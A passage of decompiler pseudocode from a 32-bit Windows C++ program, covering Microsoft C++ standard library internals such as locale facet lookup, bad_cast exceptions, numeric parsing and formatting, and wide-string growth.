  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFA18;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFA18;
  v2 = std::locale::id::operator unsigned int(&unk_4FFA04);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( std::codecvt<char,char,_Mbstatet>::_Getcat((int)&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFA18 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFA18: using guessed type int dword_4FFA18;
// 43064E: using guessed type char var_14[4];

//----- (004306E3) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_4306E3(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFA08;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFA08;
  v2 = std::locale::id::operator unsigned int(&unk_4FFA34);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( std::ctype<char>::_Getcat((int)&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFA08 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFA08: using guessed type int dword_4FFA08;
// 4306E3: using guessed type char var_14[4];

//----- (00430778) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_430778(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFA0C;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFA0C;
  v2 = std::locale::id::operator unsigned int(&unk_4FF9F8);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_43106D(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFA0C = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFA0C: using guessed type int dword_4FFA0C;
// 430778: using guessed type char var_14[4];

//----- (0043080D) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_43080D(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFA10;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFA10;
  v2 = std::locale::id::operator unsigned int(&unk_4FF9FC);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_4310D5(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFA10 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFA10: using guessed type int dword_4FFA10;
// 43080D: using guessed type char var_14[4];

//----- (004308A2) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_4308A2(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFA14;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFA14;
  v2 = std::locale::id::operator unsigned int(&unk_4FFA00);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_43113D(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFA14 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFA14: using guessed type int dword_4FFA14;
// 4308A2: using guessed type char var_14[4];

//----- (004309DA) --------------------------------------------------------
char *__thiscall sub_4309DA(char *this, int a2)
{
  sub_403C10(this, a2);
  *(_DWORD *)this = &std::bad_cast::`vftable';
  return this;
}
// 490698: using guessed type void *std::bad_cast::`vftable';

//----- (004309F5) --------------------------------------------------------
_DWORD *__thiscall sub_4309F5(_DWORD *this)
{
  _DWORD *result; // eax

  this[1] = 0;
  result = this;
  this[2] = 0;
  this[1] = "bad cast";
  *this = &std::bad_cast::`vftable';
  return result;
}
// 490698: using guessed type void *std::bad_cast::`vftable';

//----- (00430A50) --------------------------------------------------------
void __thiscall sub_430A50(_DWORD *this)
{
  *this = &std::_Facet_base::`vftable';
}
// 4906B0: using guessed type void *std::_Facet_base::`vftable';

//----- (00430B40) --------------------------------------------------------
_DWORD *__thiscall sub_430B40(_DWORD *Block, char a2)
{
  *Block = &std::ctype<char>::`vftable';
  std::ctype<char>::_Tidy();
  *Block = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 432C49: using guessed type int std::ctype<char>::_Tidy(void);
// 4906B0: using guessed type void *std::_Facet_base::`vftable';
// 4906D4: using guessed type void *std::ctype<char>::`vftable';

//----- (00430B6E) --------------------------------------------------------
_DWORD *__thiscall sub_430B6E(_DWORD *Block, char a2)
{
  *Block = &std::numpunct<char>::`vftable';
  unknown_libname_20();
  *Block = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 432C73: using guessed type int unknown_libname_20(void);
// 4906B0: using guessed type void *std::_Facet_base::`vftable';
// 490770: using guessed type void *std::numpunct<char>::`vftable';

//----- (00430B9C) --------------------------------------------------------
_DWORD *__thiscall sub_430B9C(_DWORD *Block, char a2)
{
  *Block = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 4906B0: using guessed type void *std::_Facet_base::`vftable';

//----- (0043106D) --------------------------------------------------------
int __cdecl sub_43106D(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  void *v6[13]; // [esp+10h] [ebp-44h] BYREF
  _DWORD *v7; // [esp+44h] [ebp-10h]
  int v8; // [esp+50h] [ebp-4h]

  v2 = 0;
  v7 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(8u);
    v7 = v3;
    v8 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      std::_Locinfo::_Locinfo((std::_Locinfo *)v6, v4);
      v2 = 1;
      *v3 = &std::num_get<char,std::istreambuf_iterator<char>>::`vftable';
      v3[1] = 0;
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v6);
  }
  return 4;
}
// 490704: using guessed type void *std::num_get<char,std::istreambuf_iterator<char>>::`vftable';

//----- (004310D5) --------------------------------------------------------
int __cdecl sub_4310D5(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  void *v6[13]; // [esp+10h] [ebp-44h] BYREF
  _DWORD *v7; // [esp+44h] [ebp-10h]
  int v8; // [esp+50h] [ebp-4h]

  v2 = 0;
  v7 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(8u);
    v7 = v3;
    v8 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      std::_Locinfo::_Locinfo((std::_Locinfo *)v6, v4);
      v2 = 1;
      *v3 = &std::num_put<char,std::ostreambuf_iterator<char>>::`vftable';
      v3[1] = 0;
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v6);
  }
  return 4;
}
// 490740: using guessed type void *std::num_put<char,std::ostreambuf_iterator<char>>::`vftable';

//----- (0043113D) --------------------------------------------------------
int __cdecl sub_43113D(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  int v5; // eax
  void *v7[14]; // [esp+10h] [ebp-48h] BYREF
  int v8; // [esp+48h] [ebp-10h]
  int v9; // [esp+54h] [ebp-4h]

  v2 = 0;
  v8 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(0x18u);
    v7[13] = v3;
    v9 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      v5 = std::_Locinfo::_Locinfo((std::_Locinfo *)v7, v4);
      v3[1] = 0;
      v2 = 1;
      v8 = 1;
      v9 = 2;
      *v3 = &std::numpunct<char>::`vftable';
      std::numpunct<char>::_Init(v5, 1);
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v7);
  }
  return 4;
}
// 4323C7: using guessed type _DWORD __stdcall std::numpunct<char>::_Init(_DWORD, _DWORD);
// 490770: using guessed type void *std::numpunct<char>::`vftable';

//----- (004323C2) --------------------------------------------------------
void __thiscall sub_4323C2(volatile signed __int32 *this)
{
  _InterlockedIncrement(this + 1);
}

//----- (00432C2C) --------------------------------------------------------
void __noreturn sub_432C2C()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_4309F5(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_cast_std__);
}
// 432C2C: using guessed type void __noreturn sub_432C2C();
// 432C2C: using guessed type _DWORD pExceptionObject[3];

//----- (00432CC3) --------------------------------------------------------
char sub_432CC3()
{
  return 1;
}

//----- (00432CC6) --------------------------------------------------------
char __thiscall sub_432CC6(_BYTE *this)
{
  return this[12];
}

//----- (00432CCA) --------------------------------------------------------
int sub_432CCA()
{
  return 1;
}

//----- (00432CE3) --------------------------------------------------------
int *__thiscall sub_432CE3(void *this, int *a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8, _WORD *a9)
{
  int v10; // esi
  _DWORD *v11; // ebx
  int v12; // eax
  int v13; // edi
  _WORD *v14; // eax
  int *v15; // esi
  unsigned int v16; // eax
  _WORD *v17; // ecx
  int *result; // eax
  const struct std::locale *v19; // [esp-4h] [ebp-5Ch]
  int *v20; // [esp+14h] [ebp-44h] BYREF
  int v21; // [esp+18h] [ebp-40h] BYREF
  int v22; // [esp+1Ch] [ebp-3Ch] BYREF
  _WORD *v23; // [esp+20h] [ebp-38h]
  bool v24; // [esp+27h] [ebp-31h]
  char v25; // [esp+28h] [ebp-30h] BYREF
  int v26; // [esp+29h] [ebp-2Fh] BYREF
  int v27; // [esp+54h] [ebp-4h]

  v10 = a7;
  v11 = a8;
  v19 = *(const struct std::locale **)(a7 + 48);
  v23 = a9;
  std::locale::locale((std::locale *)&v21, v19);
  v27 = 0;
  v12 = std::num_get<char,std::istreambuf_iterator<char>>::_Getifld(
          (int)this,
          (int)&v25,
          (int)&a3,
          (int)&a5,
          *(_DWORD *)(v10 + 20),
          (std::locale *)&v21);
  v27 = -1;
  v13 = v12;
  sub_42DEE0(&v21);
  if ( v25 )
  {
    v15 = (int *)&v25;
    v24 = v25 == 45;
    if ( v25 == 45 )
      v15 = &v26;
    v16 = _Stoulx(v15, &v20, v13, &v22);
    v17 = v23;
    *v23 = v16;
    if ( v20 == v15 || v22 || v16 > 0xFFFF )
    {
      *v11 = 2;
      *v17 = -1;
    }
    else if ( v24 )
    {
      *v17 = -(__int16)v16;
    }
  }
  else
  {
    v14 = v23;
    *v11 = 2;
    *v14 = 0;
  }
  if ( (unsigned __int8)std::istreambuf_iterator<char>::equal(&a5) )
    *v11 |= 1u;
  result = a2;
  *a2 = a3;
  a2[1] = a4;
  return result;
}
// 433DD0: using guessed type _DWORD __stdcall std::istreambuf_iterator<char>::equal(_DWORD);
// 446626: using guessed type _DWORD __cdecl _Stoulx(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00432DD1) --------------------------------------------------------
_DWORD *__stdcall sub_432DD1(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8)
{
  int *v8; // eax
  int v9; // esi
  int v10; // edx
  _DWORD *result; // eax
  char v12[8]; // [esp+4h] [ebp-Ch] BYREF
  int v13; // [esp+Ch] [ebp-4h] BYREF

  v8 = (int *)unknown_libname_24(v12, a2, a3, a4, a5, a6, a7, &v13);
  v9 = *v8;
  v10 = v8[1];
  *a8 = v13;
  result = a1;
  *a1 = v9;
  a1[1] = v10;
  return result;
}
// 432ED8: using guessed type _DWORD __stdcall unknown_libname_24(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 432DD1: using guessed type char var_C[8];

//----- (004331C9) --------------------------------------------------------
int *__thiscall sub_4331C9(void *this, int *a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8, _DWORD *a9)
{
  _DWORD *v10; // edi
  int v11; // eax
  int v12; // esi
  int v13; // eax
  _DWORD *v14; // ecx
  int *result; // eax
  const struct std::locale *v16; // [esp-4h] [ebp-54h]
  int *v17; // [esp+10h] [ebp-40h] BYREF
  int v18; // [esp+14h] [ebp-3Ch] BYREF
  int v19; // [esp+18h] [ebp-38h] BYREF
  _DWORD *v20; // [esp+1Ch] [ebp-34h]
  _BYTE v21[44]; // [esp+20h] [ebp-30h] BYREF
  int v22; // [esp+4Ch] [ebp-4h]

  v10 = a8;
  v16 = *(const struct std::locale **)(a7 + 48);
  v20 = a9;
  std::locale::locale((std::locale *)&v18, v16);
  v22 = 0;
  v11 = std::num_get<char,std::istreambuf_iterator<char>>::_Getifld(
          (int)this,
          (int)v21,
          (int)&a3,
          (int)&a5,
          2048,
          (std::locale *)&v18);
  v22 = -1;
  v12 = v11;
  sub_42DEE0(&v18);
  if ( !v21[0] )
  {
    v14 = v20;
LABEL_6:
    *v10 = 2;
    *v14 = 0;
    goto LABEL_7;
  }
  v13 = _Stoulx(v21, &v17, v12, &v19);
  v14 = v20;
  *v20 = v13;
  if ( v17 == (int *)v21 || v19 )
    goto LABEL_6;
LABEL_7:
  if ( (unsigned __int8)std::istreambuf_iterator<char>::equal(&a5) )
    *v10 |= 1u;
  result = a2;
  *a2 = a3;
  a2[1] = a4;
  return result;
}
// 433DD0: using guessed type _DWORD __stdcall std::istreambuf_iterator<char>::equal(_DWORD);
// 446626: using guessed type _DWORD __cdecl _Stoulx(_DWORD, _DWORD, _DWORD, _DWORD);
// 4331C9: using guessed type _BYTE var_30[44];

//----- (00433728) --------------------------------------------------------
int __thiscall sub_433728(void *this, int a2, int a3, int a4, int a5, int a6, int a7)
{
  const char *v8; // eax
  int v9; // eax
  char Buffer[64]; // [esp+Ch] [ebp-4Ch] BYREF
  char v12[8]; // [esp+4Ch] [ebp-Ch] BYREF

  v8 = (const char *)unknown_libname_19(this, v12, "lu", *(_DWORD *)(a5 + 20));
  v9 = sprintf_s(Buffer, 0x40u, v8, a7);
  std::num_put<char,std::ostreambuf_iterator<char>>::_Iput((int)this, a2, a3, a4, a5, a6, (int)Buffer, v9);
  return a2;
}
// 43232C: using guessed type _DWORD __cdecl unknown_libname_19(_DWORD, _DWORD, _DWORD, _DWORD);
// 433728: using guessed type char var_C[8];

//----- (00433793) --------------------------------------------------------
int __thiscall sub_433793(void *this, int a2, int a3, int a4, _DWORD *a5, int a6, double X)
{
  int v7; // esi
  int v8; // eax
  int v9; // ebx
  int v10; // ebx
  const char *v11; // eax
  char *v12; // ecx
  int v13; // eax
  char *v14; // ecx
  char *v15; // ecx
  int Y; // [esp+20h] [ebp-38h] BYREF
  unsigned int v18; // [esp+24h] [ebp-34h] BYREF
  char Buffer[4]; // [esp+28h] [ebp-30h] BYREF
  size_t BufferCount; // [esp+38h] [ebp-20h]
  unsigned int v21; // [esp+3Ch] [ebp-1Ch]
  char v22[20]; // [esp+40h] [ebp-18h] BYREF
  int v23; // [esp+54h] [ebp-4h]

  v18 = (unsigned int)this;
  BufferCount = 0;
  v21 = 15;
  Buffer[0] = 0;
  v7 = a5[6];
  v8 = a5[5] & 0x3000;
  v23 = 0;
  if ( __SPAIR64__(a5[7], v7) > 0 || v8 == 0x2000 )
  {
    v9 = v7;
    if ( v8 == 0x2000 && fabs(X) > 1.0e10 )
    {
      frexp(X, &Y);
      v9 = (int)(30103 * abs32(Y)) / 100000 + v7;
    }
  }
  else
  {
    v7 = 6;
    v9 = 6;
  }
  sub_40E9F0(Buffer, v9 + 50, 0);
  v10 = v18;
  v11 = (const char *)unknown_libname_18(v18, v22, 0, a5[5]);
  v12 = Buffer;
  if ( v21 >= 0x10 )
    v12 = *(char **)Buffer;
  v13 = sprintf_s(v12, BufferCount, v11, v7, X);
  v14 = Buffer;
  if ( v21 >= 0x10 )
    v14 = *(char **)Buffer;
  std::num_put<char,std::ostreambuf_iterator<char>>::_Fput(v10, a2, a3, a4, (int)a5, a6, v14, v13);
  if ( v21 >= 0x10 )
  {
    v15 = *(char **)Buffer;
    v18 = v21 + 1;
    Y = *(_DWORD *)Buffer;
    if ( v21 + 1 >= 0x1000 )
    {
      std::_Adjust_manually_vector_aligned((void **)&Y, &v18);
      v15 = (char *)Y;
    }
    sub_44775B(v15);
  }
  return a2;
}
// 430BD1: using guessed type _DWORD __cdecl unknown_libname_18(_DWORD, _DWORD, char, _DWORD);
// 433793: using guessed type char var_18[20];

//----- (004338D4) --------------------------------------------------------
int __thiscall sub_4338D4(void *this, int a2, int a3, int a4, _DWORD *a5, int a6, double X)
{
  int v7; // esi
  int v8; // eax
  int v9; // ebx
  int v10; // ebx
  const char *v11; // eax
  char *v12; // ecx
  int v13; // eax
  char *v14; // ecx
  char *v15; // ecx
  int Y; // [esp+20h] [ebp-38h] BYREF
  unsigned int v18; // [esp+24h] [ebp-34h] BYREF
  char Buffer[4]; // [esp+28h] [ebp-30h] BYREF
  size_t BufferCount; // [esp+38h] [ebp-20h]
  unsigned int v21; // [esp+3Ch] [ebp-1Ch]
  char v22[20]; // [esp+40h] [ebp-18h] BYREF
  int v23; // [esp+54h] [ebp-4h]

  v18 = (unsigned int)this;
  BufferCount = 0;
  v21 = 15;
  Buffer[0] = 0;
  v7 = a5[6];
  v8 = a5[5] & 0x3000;
  v23 = 0;
  if ( __SPAIR64__(a5[7], v7) > 0 || v8 == 0x2000 )
  {
    v9 = v7;
    if ( v8 == 0x2000 && fabs(X) > 1.0e10 )
    {
      frexp(X, &Y);
      v9 = (int)(30103 * abs32(Y)) / 100000 + v7;
    }
  }
  else
  {
    v7 = 6;
    v9 = 6;
  }
  sub_40E9F0(Buffer, v9 + 50, 0);
  v10 = v18;
  v11 = (const char *)unknown_libname_18(v18, v22, 76, a5[5]);
  v12 = Buffer;
  if ( v21 >= 0x10 )
    v12 = *(char **)Buffer;
  v13 = sprintf_s(v12, BufferCount, v11, v7, X);
  v14 = Buffer;
  if ( v21 >= 0x10 )
    v14 = *(char **)Buffer;
  std::num_put<char,std::ostreambuf_iterator<char>>::_Fput(v10, a2, a3, a4, (int)a5, a6, v14, v13);
  if ( v21 >= 0x10 )
  {
    v15 = *(char **)Buffer;
    v18 = v21 + 1;
    Y = *(_DWORD *)Buffer;
    if ( v21 + 1 >= 0x1000 )
    {
      std::_Adjust_manually_vector_aligned((void **)&Y, &v18);
      v15 = (char *)Y;
    }
    sub_44775B(v15);
  }
  return a2;
}
// 430BD1: using guessed type _DWORD __cdecl unknown_libname_18(_DWORD, _DWORD, char, _DWORD);
// 4338D4: using guessed type char var_18[20];

//----- (00433ADE) --------------------------------------------------------
int __thiscall sub_433ADE(void *this, int a2, int a3, int a4, int a5, int a6, int a7, int a8)
{
  const char *v9; // eax
  int v10; // eax
  char Buffer[64]; // [esp+Ch] [ebp-4Ch] BYREF
  char v13[8]; // [esp+4Ch] [ebp-Ch] BYREF

  v9 = (const char *)unknown_libname_19(this, v13, "Lu", *(_DWORD *)(a5 + 20));
  v10 = sprintf_s(Buffer, 0x40u, v9, a7, a8);
  std::num_put<char,std::ostreambuf_iterator<char>>::_Iput((int)this, a2, a3, a4, a5, a6, (int)Buffer, v10);
  return a2;
}
// 43232C: using guessed type _DWORD __cdecl unknown_libname_19(_DWORD, _DWORD, _DWORD, _DWORD);
// 433ADE: using guessed type char var_C[8];

//----- (00433CF6) --------------------------------------------------------
char __thiscall sub_433CF6(_BYTE *this)
{
  return this[13];
}

//----- (00434082) --------------------------------------------------------
double __cdecl sub_434082(float a1, int Y)
{
  return (float)ldexp(a1, Y);
}

//----- (004341CF) --------------------------------------------------------
int sub_4341CF()
{
  return dword_4FFA44;
}
// 4FFA44: using guessed type int dword_4FFA44;

//----- (00434B0A) --------------------------------------------------------
void __cdecl sub_434B0A(LPCRITICAL_SECTION lpCriticalSection)
{
  LeaveCriticalSection(lpCriticalSection);
}

//----- (004353CB) --------------------------------------------------------
int __thiscall sub_4353CB(int this, int a2, std::_Locinfo *a3)
{
  _Cvtvec *v3; // ebx
  char *v4; // eax
  int v5; // eax
  int v6; // esi
  char *v7; // eax
  int result; // eax
  _Cvtvec v9; // [esp+Ch] [ebp-30h] BYREF
  int v10; // [esp+38h] [ebp-4h]

  v10 = this;
  v3 = (_Cvtvec *)(this + 24);
  qmemcpy((void *)(this + 24), _Getcvt(&v9), 0x2Cu);
  v4 = (char *)std::_Locinfo::_Getdays(a3);
  v5 = std::_Maklocstr<wchar_t>(v4, 0, v3);
  v6 = v10;
  *(_DWORD *)(v10 + 8) = v5;
  v7 = (char *)std::_Locinfo::_Getmonths(a3);
  *(_DWORD *)(v6 + 12) = std::_Maklocstr<wchar_t>(v7, 0, v3);
  result = std::_Maklocstr<wchar_t>(":AM:am:PM:pm", 0, v3);
  *(_DWORD *)(v6 + 16) = result;
  return result;
}

//----- (004356DE) --------------------------------------------------------
void **__thiscall sub_4356DE(void **Src, unsigned int a2, char a3, size_t N, wchar_t C)
{
  int v6; // ecx
  void *v7; // edi
  char *v8; // esi
  void *v9; // eax
  void *v10; // esi
  void *v12; // [esp+Ch] [ebp-Ch]
  unsigned int v13; // [esp+10h] [ebp-8h]
  int v14; // [esp+14h] [ebp-4h]

  v6 = (int)Src[4];
  v14 = v6;
  if ( 2147483646 - v6 < a2 )
    sub_404900();
  v7 = (void *)(v6 + a2);
  v13 = (unsigned int)Src[5];
  v8 = (char *)std::wstring::_Calculate_growth(v6 + a2, v13, 2147483646);
  v9 = (void *)std::allocator<wchar_t>::allocate(v8 + 1);
  Src[4] = v7;
  v12 = v9;
  Src[5] = v8;
  if ( v13 < 8 )
  {
    unknown_libname_52(v9, Src, v14, N, C);
  }
  else
  {
    v10 = *Src;
    unknown_libname_52(v9, *Src, v14, N, C);
    sub_404820(v10, 2 * v13 + 2);
  }
  *Src = v12;
  return Src;
}
// 404900: using guessed type void __noreturn sub_404900(void);
// 436EEB: using guessed type _DWORD __cdecl std::wstring::_Calculate_growth(_DWORD, _DWORD, _DWORD);
// 43E6E1: using guessed type _DWORD __stdcall std::allocator<wchar_t>::allocate(_DWORD);

//----- (00435773) --------------------------------------------------------
void **__thiscall sub_435773(void **Src, unsigned int a2, char a3, void *a4, int a5)
{
  int v6; // ecx
  void *v7; // edi
  char *v8; // esi
  void *v9; // eax
  void *v10; // esi
  void *v12; // [esp+Ch] [ebp-Ch]
  unsigned int v13; // [esp+10h] [ebp-8h]
  int v14; // [esp+14h] [ebp-4h]

  v6 = (int)Src[4];
  v14 = v6;
  if ( 2147483646 - v6 < a2 )
    sub_404900();
  v7 = (void *)(v6 + a2);
  v13 = (unsigned int)Src[5];
  v8 = (char *)std::wstring::_Calculate_growth(v6 + a2, v13, 2147483646);
  v9 = (void *)std::allocator<wchar_t>::allocate(v8 + 1);
  Src[4] = v7;
  v12 = v9;
  Src[5] = v8;
  if ( v13 < 8 )
  {
    `std::wstring::append'::`2'::_lambda_1_::operator()(v9, Src, v14, a4, a5);
  }
  else
  {
    v10 = *Src;
    `std::wstring::append'::`2'::_lambda_1_::operator()(v9, *Src, v14, a4, a5);
    sub_404820(v10, 2 * v13 + 2);
  }
  *Src = v12;
  return Src;
}
// 404900: using guessed type void __noreturn sub_404900(void);
// 436EEB: using guessed type _DWORD __cdecl std::wstring::_Calculate_growth(_DWORD, _DWORD, _DWORD);
// 43E6E1: using guessed type _DWORD __stdcall std::allocator<wchar_t>::allocate(_DWORD);

//----- (00435A29) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_435A29(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFBAC;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFBAC;
  v2 = std::locale::id::operator unsigned int(&unk_4FFA2C);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( std::codecvt<wchar_t,char,_Mbstatet>::_Getcat((int)&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFBAC = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFBAC: using guessed type int dword_4FFBAC;
// 435A29: using guessed type char var_14[4];

//----- (00435ABE) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_435ABE(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFB78;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFB78;
  v2 = std::locale::id::operator unsigned int(&unk_4FFA28);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( std::codecvt<wchar_t,char,_Mbstatet>::_Getcat((int)&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFB78 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFB78: using guessed type int dword_4FFB78;
// 435ABE: using guessed type char var_14[4];

//----- (00435B53) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_435B53(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

